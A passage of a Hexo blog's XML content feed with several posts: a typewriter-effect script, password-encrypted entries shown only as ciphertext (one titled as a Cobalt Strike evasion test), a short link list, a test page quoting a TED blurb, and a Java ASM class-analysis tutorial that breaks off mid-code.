class="property">step</span>-- : (c.<span class="property">step</span> = g, c.<span class="property">prefixP</span> &lt; l.<span class="property">length</span> ? (c.<span class="property">prefixP</span> &gt;= <span class="number">0</span> &amp;&amp; (c.<span class="property">text</span> += l[c.<span class="property">prefixP</span>]), c.<span class="property">prefixP</span>++) : <span class="string">&quot;forward&quot;</span> === c.<span class="property">direction</span> ? c.<span class="property">skillP</span> &lt; t.<span class="property">length</span> ? (c.<span class="property">text</span> += t[c.<span class="property">skillP</span>], c.<span class="property">skillP</span>++) : c.<span class="property">delay</span> ? c.<span class="property">delay</span>-- : (c.<span class="property">direction</span> = <span class="string">&quot;backward&quot;</span>, c.<span class="property">delay</span> = a) : c.<span class="property">skillP</span> &gt; <span class="number">0</span> ? (c.<span class="property">text</span> = c.<span class="property">text</span>.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>), c.<span class="property">skillP</span>--) : (c.<span class="property">skillI</span> = (c.<span class="property">skillI</span> + <span class="number">1</span>) % o.<span class="property">length</span>, c.<span class="property">direction</span> = <span class="string">&quot;forward&quot;</span>)), </span></span><br><span class="line"><span class="language-javascript">r.<span class="property">textContent</span> = c.<span class="property">text</span>,</span></span><br><span class="line"><span class="language-javascript">r.<span class="title function_">appendChild</span>(<span class="title function_">n</span>(c.<span class="property">prefixP</span> &lt; l.<span class="property">length</span> ? <span class="title class_">Math</span>.<span class="title function_">min</span>(s, s + c.<span class="property">prefixP</span>) : <span class="title class_">Math</span>.<span class="title function_">min</span>(s, t.<span class="property">length</span> - c.<span class="property">skillP</span>))),</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(i, d)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> l = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">o = [<span class="string">&quot;醒亦念卿，梦亦念卿&quot;</span>,<span class="string">&quot;频繁记录，只因生活和你太值得&quot;</span>,<span class="string">&quot;孜孜不倦，认真且怂&quot;</span>].<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">r</span>) &#123;<span class="keyword">return</span> r + <span class="string">&quot;&quot;</span>&#125;),</span></span><br><span class="line"><span class="language-javascript">a = <span class="number">2</span>,g = <span class="number">1</span>,s = <span class="number">5</span>,d = <span class="number">75</span>,</span></span><br><span class="line"><span class="language-javascript">b = [<span class="string">&quot;rgb(110,64,170)&quot;</span>, <span class="string">&quot;rgb(150,61,179)&quot;</span>, <span class="string">&quot;rgb(191,60,175)&quot;</span>, <span class="string">&quot;rgb(228,65,157)&quot;</span>, <span class="string">&quot;rgb(254,75,131)&quot;</span>, <span class="string">&quot;rgb(255,94,99)&quot;</span>, <span class="string">&quot;rgb(255,120,71)&quot;</span>, <span class="string">&quot;rgb(251,150,51)&quot;</span>, <span class="string">&quot;rgb(226,183,47)&quot;</span>, <span class="string">&quot;rgb(198,214,60)&quot;</span>, <span class="string">&quot;rgb(175,240,91)&quot;</span>, <span class="string">&quot;rgb(127,246,88)&quot;</span>, <span class="string">&quot;rgb(82,246,103)&quot;</span>, <span class="string">&quot;rgb(48,239,130)&quot;</span>, <span class="string">&quot;rgb(29,223,163)&quot;</span>, <span class="string">&quot;rgb(26,199,194)&quot;</span>, <span class="string">&quot;rgb(35,171,216)&quot;</span>, <span class="string">&quot;rgb(54,140,225)&quot;</span>, <span class="string">&quot;rgb(76,110,219)&quot;</span>, <span class="string">&quot;rgb(96,84,200)&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">c = &#123;<span class="attr">text</span>: <span class="string">&quot;&quot;</span>,<span class="attr">prefixP</span>: -s,<span class="attr">skillI</span>: <span class="number">0</span>,<span class="attr">skillP</span>: <span class="number">0</span>,<span class="attr">direction</span>: <span class="string">&quot;forward&quot;</span>,<span class="attr">delay</span>: a,<span class="attr">step</span>: g&#125;;<span class="title function_">i</span>()</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">colortap</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colortap1&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bufferfly搭建指南</title>
      <link href="/2022/11/22/Bufferfly%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/"/>
      <url>/2022/11/22/Bufferfly%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e483119a8f1c7ea3a48960fb00acb4a6a0346c9212dd84a6bf0bc51c8fa4f7d5">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7ac9c555f3347a518ca8fa9c4c4ffa4e4017ee8cf45b73e966b15c0a2b7a19d9558530a33b33740a6509e72fbdde28cb211c6d0c731962e1694dfccb7c0c1cd6cadd446034d05bfbdaa062c4d97129b960ada463ad1f00de8697f4c4e8aa155f53a65ed5c9d9b8db8f7475101fec6babd475b88b9d8aaf517aa49f8825417d3ce40c3808125aedc5235d372ee3b01d295e2edbde573fa31519ba68ad6b80858fb57ea112fd32cd992394d243db52cc7b4aade01de22a3bf153326df1abe8d52571a9c79ba5affdf16dc7259fa7e91388021dd8a43c885003a2f45a8a6f967b42a1284f57ec38648507383ddd26b59c78bbd85daeda670f6710cd56bf192773b3f6465f2e34b4a9ccc50eeed17df83f2849330dc73bf4a4e4c575241a7e65bde262c45dbfff2690f5ecd41060012bd904289471546f7eb4e423c366e7c45cecb7f97897b713bd124ac0e7f9d40a431155f49540ca4d916639e1598c7e918d910e0825fc05c9d7e7ec9d94af85f4f193ce093335bec8a71efa7e9fc95bb96572fecbd526f0a00e8bc0cf50ef6a017f6698bc0a31993585ed98a22f0319925ab255e4476b5996a1c4d3e683dc4cb9dbb9b72e88a1904a65539a2a2d727b88eef66e0ab93c6f0ca57bd86ba346ec3e841fca0dc3e8ebc926cf27f54bde615fb8967e40cd642e171fe6586d342a0210e83ae4e99e6b3aaa8f6a4eb5afcae841de5ecd787e9c731c2d3a005964becf63e2a29c94743b3fab35ecbca6349cd129b2b7fd02086cf603ce23c5347979143d96a62ac6c2dc6c26a4326e2de9099f51cbf8f430384643fbe88a0998189a65e10df1756929f371eac0b1520edeea1b8d4a656e83ca3f822a90c9d6b98f942929b228a82d8104601b526b193a852e380beb32c8c715a9bd63d14ed95a5962de1d10d922a246853f890280ba4db600ef3ab92116bf8132656adda66c3dfbf987a8916d2d6f3edd69ffc312651ce5e536f5b001bcf6fb96dc2608e8de74950448c6e788bc71aad85fd1d91c186f4a820483df342590ec46ab95778e0c6a2d565ce00603652964fb6fad4cadbf6850b2c2541dedcba89ac49bf1acab2ce7b185340bf7b2eea972bba2649f2ad9ba42d0131185b9a9a5a0180312750fa5bee6384f2f1c275db972cf8a5cb342711018b35a8b93b8674dd7114f2dcc632ac09b4f4e8d1c9e4e1faf1fbfeef39a13d0cff920864529eff7ff300bab3e044c87febcfe5a3ee5d3d4f0f4b05aca72bf01d140efbb98a5425472bec6ccc1e909b3920e474ea4bdff006c3c7462329866798af2bf4dec37ecaf8568f67a6b7ef1a2ec81d81b5ad0ee4f840aef245c668bc342ddb9907f504e9dc87dcbd32cc495888a066e2e2b057d77bace11fe5d51b15222c5b53759d08379db3f4589e2b789b86a242bef0f6b21a43db26a596fae88b760852cbd8481d53ce1866ef2e3f83f71ab261da3c6a692cf9c8b17597ccb3b1e535d8ce90919dcc68805f0853c8f35b09a963acc2e8c7a41aa1a429437e752d8c28c429d0d3da0ce6799f2cb12315ca76ba5b00244a2d15f4b2f5d012e680f01004fdd7a93ab840ee86029352b11e72d861ca8464e817f72a15dd83e60d2204680f3b0bd8b8a083db039b69181232e8b942ea36f5883f436fe27a6687e196017275db4d5d22a9e700a77a026b43745e75ff4b361eb6bcca51957a09967838a28338754c1fc179f4511470f94b370465e21e585f062e1b2b591a1aec7201d8a5082dfb5a5f18bc9402acd039d2284fea381ee80545af72d356b5f53b2b5432186971f0f5f0d850984f9d80a69342055e537a0684619fb555a2537d19a071543e9b74d90ab72bb306e1a7a21160ff03c9008f06aca38cdb6a6d48df56f9f4b48405fa683b80a120db02a4a7297ed9a55620e97fb6e00ea37c14e19d299e7e35851021bea9e8ae2c301b8e29570e207643d885ab5eda4cfdd6ee3eff610a7a134e31e439d06c81d53b2611825286a24eb8c1fb175e227d17ae94815fdcbf5da52fa98b1e414584081c9e350fbe1188411621cb17e432c9f089281e6485dcbee433203d9550c06b04a647acca2db52a0f88fea8676bb224183e1e4e5d6e38eeca8a00c6c159d50a73da7814a75d61687667586f848f16c6eeef6f22c0837aad2246b5371a2f927c58875311b546427fbb1730598cca87529be494cedf82b88842cf75cb9bfc458a9636ff7f7a1eb86819e41ae3fa73af96c1e8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">what's that?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Bufferfly </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bufferfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobalstrike免杀测试</title>
      <link href="/2022/11/22/cobalstrike%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/11/22/cobalstrike%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3a47fd570f7861fbec2dd173b1cf12745e7d41de44edad5011b5f204d1f13182">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b88a980657e3110c1f5c0538f81b5fff498891ec26b4ce29098a2a84bfd6d380eeb88e9096f607e3ed5d7fc8ed0e81d99d0b244b77974e84164960a1a56c5ede3c3c80f161ac60d6767b6cc78367e7790fef62e9969e98fe92fb1dc8cbffc6a68891c3f7545b0a4dfe99b8a6718f8d5cec406125b6c8294c6422ecc949e2dcf3665ae07da010f88d8b11eb720d434e063934afc36f013b9f05eae64c42be2484f117aa0e8963b92bdc782542833c0e32d429bcfd938024c7cf89ce63c1f2c748767470338e53feeff0dfbc24d1cf6e858545fc1191181142eb8128861eed858eb9e492a76b8b414ab4ed31e37334f553195f4fdef078c6f28ab69f236d0d6a925744dbdcd7635bfb1d7a46345eae9c4c0d617135a10d10d736030137b7eca13cb367cb36bb879bf8b052cf41b682769fccec7c1b025438699292f0d8fc50cbd91de276372e516b20bf3e004fa3e0d69e84aa0d124a2a1d62ae1ebd57e18784955466176ba7241cde1dbe4d899fba30f59b3a470bb415efa6d6ecd0f3a895d210b98d19c6c6d557b62a616d378597013b2add143ff879ae56648a57136b731a30059c44772d1830d10e5f00a3b1b2d595afdb7ecfc795b21d21f69c937d7efbc5858759eb7a0e7dd65feea5c5379054e08daf1d68cccfcd97347163f243e969d19ff7b2a842803f4a39626056920834989443e5c5d0cf8a43b3d241f7460c582bdfc22eb339b845c9eb833cd1f369cd2a4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输出正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有趣的网站分享</title>
      <link href="/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/"/>
      <url>/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="有趣网站指南"><a href="#有趣网站指南" class="headerlink" title="有趣网站指南"></a>有趣网站指南</h1><h2 id="编程相关"><a href="#编程相关" class="headerlink" title="编程相关"></a>编程相关</h2><ul><li>每一个程序员都应该知道的网站：<a href="https://github.com">https://github.com</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 有趣的网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Test-topBanner&amp;&amp;参数释义</title>
      <link href="/2022/11/21/Test-topBanner/"/>
      <url>/2022/11/21/Test-topBanner/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，这里需要密码才可以访问哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Test-swiper-index</title>
      <link href="/2022/11/21/Test-swiper-index/"/>
      <url>/2022/11/21/Test-swiper-index/</url>
      
        <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
      
      
      <categories>
          
          <category> Bufferfly </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bufferfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first-page</title>
      <link href="/2022/11/19/first-page/"/>
      <url>/2022/11/19/first-page/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0e4dedf5b31b16ede99027646cfbd77f29f5c78df4cc27d088ac4f3dc1318fce"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">听说只有管理员才可以查看哦</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asm</title>
      <link href="/2022/11/19/asm/"/>
      <url>/2022/11/19/asm/</url>
      
        <content type="html"><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span 